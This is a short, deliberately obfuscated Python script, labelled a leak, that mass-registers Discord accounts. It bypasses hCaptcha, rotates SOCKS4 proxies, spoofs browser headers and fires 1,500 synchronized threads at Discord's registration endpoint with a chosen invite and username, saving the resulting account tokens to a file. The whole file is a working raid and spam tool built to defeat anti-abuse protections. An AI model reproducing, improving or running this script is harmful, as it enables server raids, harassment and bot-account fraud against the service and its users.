# leak by larina
from concurrent.futures import ThreadPoolExecutor
from httpx_socks import SyncProxyTransport
from random import choice
from httpx import Client
from HCaptcha import Bypass
from time import sleep, time
from sys import argv

_______0,_____0,___0,_00 = 20, ThreadPoolExecutor(max_workers=100000),argv[1],argv[2]

def ___O(X, OO_):
    X_,_p = Bypass()
    print("captcha bypass")
    while True:
        if OO_ <= int(time()):break
        sleep(0.5)
    while True:
        try:
            _ = Client(transport=SyncProxyTransport.from_url(f'socks4://{_p}')).post("https://discord.com/api/v9/auth/register", headers={"Host":"discord.com", "Connection":"keep-alive","sec-ch-ua":'"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"', "X-Super-Properties":"eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IEVkZy85My4wLjk2MS40NyIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAuNDU3Ny42MyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy81NTQxMjU3Nzc4MTg2MTU4NDQvODcwODgxOTEyMzQyODUxNTk1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk3NTA3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==", "X-Fingerprint": "", "Accept-Language":"en-US", "sec-ch-ua-mobile":"?0", "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47", "Content-Type":"application/json", "Authorization":"undefined", "Accept":"*/*", "Origin":"https://discord.com", "Sec-Fetch-Site":"same-origin", "Sec-Fetch-Mode":"cors", "Sec-Fetch-Dest":"empty", "Referer":"https://discord.com/czloed_Dhub", "X-Debug-Options":"bugReporterEnabled", "Accept-Encoding":"gzip, deflate, br", "Cookie": "OptanonConsent=version=6.17.0; locale=th"}, json={"fingerprint": "", "username":f"{_00} {choice(['1','0'])}", "invite": X, "consent": True, "gift_code_sku_id":"", "captcha_key": X_}).json()["token"]
            __00 = open("tokens.txt", "a")
            __00.write(f'{_}\n')
            __00.close()
            print(_)
        except : pass

___OO = int(time()+_______0)
print(f"in: {_______0} sec")
for _ in range (1500): _____0.submit(___O,___0, ___OO)
print("all thread started")